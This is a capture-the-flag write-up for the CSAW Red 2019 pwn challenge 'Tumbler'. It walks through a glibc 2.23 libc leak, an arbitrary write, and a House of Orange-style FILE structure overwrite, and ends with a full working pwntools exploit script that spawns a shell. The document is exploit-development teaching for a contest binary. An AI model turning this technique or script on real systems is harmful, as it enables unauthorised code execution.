---
title: CSAW Red 19 Tumbler
---

I was one of the two teams that solved Tumbler from [CSAW Red](https://red.csaw.io). 

#### Problem
*Pwn 500*

No way that cryptocurrency is a scam, that would NEVER happen

`nc pwn.chal.csaw.io 1000`

#### Analysis
The libc provided was 2.23.
```bash
$ strings libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
        GNU Libidn by Simon Josefsson
```

Decompiling the binary, it is immediately apparent that we have an arbitrary write primitive in one of the later functions called.

```c
void arb_write(void)

{
  void *__buf;

  puts("Which coin do you want to edit?");
  __buf = (void *)get_number();
  puts("What are you writing?");
  read(0,__buf,0x100);
  return;
}
```

<!--more-->

Furthermore, due to the use of malloc instead of calloc, we can leak a libc address by setting an address to an unsorted bin sized chunk, and then freeing it. 

```python
p.recvuntil("Please enter your address")
p.sendline("A" * 0x80)
p.recvuntil("Is your address correct? This is important. y/n")
p.sendline("n")
p.sendline("A" * 7)
```

Note that the `"A" * 7` is taken from the unsorted bin chunk created from freeing `"A" * 0x80`. Thus, we can get a libc leak by carefully overwriting only the first 8 bytes (the remaining 8 bytes contains a back pointer to libc).

#### Solution

Now that we have a libc leak and arbitrary write, we need a way to redirect code execution. Nothing interesting really happens after our arbitrary write primitive.

```c
  ...
  arb_write();
  puts("Your coins are now ours.\nDon\'t forget your keys, or that\'s where they\'ll stay.");
  return 0;
}
```

Unfortunately, both PIE and Full RELRO are enabled, making a GOT overwrite impossible.

```bash
$ checksec -f tumbler
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   90 Symbols     Yes      0               10      tumbler
```

As always, it's useful to take a look at the glibc source code. The code for `__libc_start_main` can be found in `./csu/libc-start.c`. 

```c
#else
  /* Nothing fancy, just call the function.  */
  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);
#endif

  exit (result);
```

It appears nothing fancy happens - only exit gets called. Well what happens when exit gets called? `exit` is defined in `./stdlib/exit.c`. There are a lot of function pointers, but unfortunately all of them are in a read only section of libc memory. Interestingly enough, there is an additional hook at the end.

```c
  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());
```

A simple inspection in GDB reveals `__libc_atexit` points to `_IO_cleanup`, which is found in `./libio/genops.c`. 

```c
int
_IO_cleanup (void)
{
  int result = _IO_flush_all_lockp (0);

  _IO_unbuffer_all ();

  return result;
}
```

Wait a minute... The `_IO_flush_all_lockp` function sounds familiar. It's the same function used in House of Orange (see this [tutorial](https://1ce0ear.github.io/2017/11/26/study-house-of-orange/) for more info). 

In fact, our exploit is even simpler than the standard House of Orange because we don't need to rely on an unsorted bin attack to overwrite the `_IO_list_all` pointer, we can overwrite it directly with our arbitrary write. With a bit of clever compression overlapping the vtable with the file struct, our payload easily fits under the 0x100 size limit.

My final exploit is as follows.

```python
from pwn import *

e = ELF("./tumbler")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.chal.csaw.io", 1000)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("enter")
p.sendline("A")
p.recvuntil("enter")
p.sendline("A" * 0x80)
p.recvuntil("y/n")
p.sendline("n")
p.sendline("A" * 7)
p.recvuntil("y/n")
p.sendline("y")

p.recvuntil("Address:")
p.recvline()

leak = u64(p.recvline(keepends=False)[:6] + "\x00\x00") - 0x7f18390bebf8 + 0x00007f1838cfa000
print("{:#x}".format(leak))


p.recvuntil("?")
p.send(str(leak + libc.symbols["_IO_list_all"]))
p.recvuntil("?")

p.sendline(
  p64(leak + libc.symbols["_IO_list_all"] + 8)
+ ("/bin/sh\x00" + p64(leak + libc.symbols["system"]) + p64(0) * 3 + p64(0x1001)).ljust(0xc0, "\x00")
+ "\x00" * 8 * 3
+ p64(leak + libc.symbols["_IO_list_all"] + 0x10 - 0x18)
)

p.interactive()
```
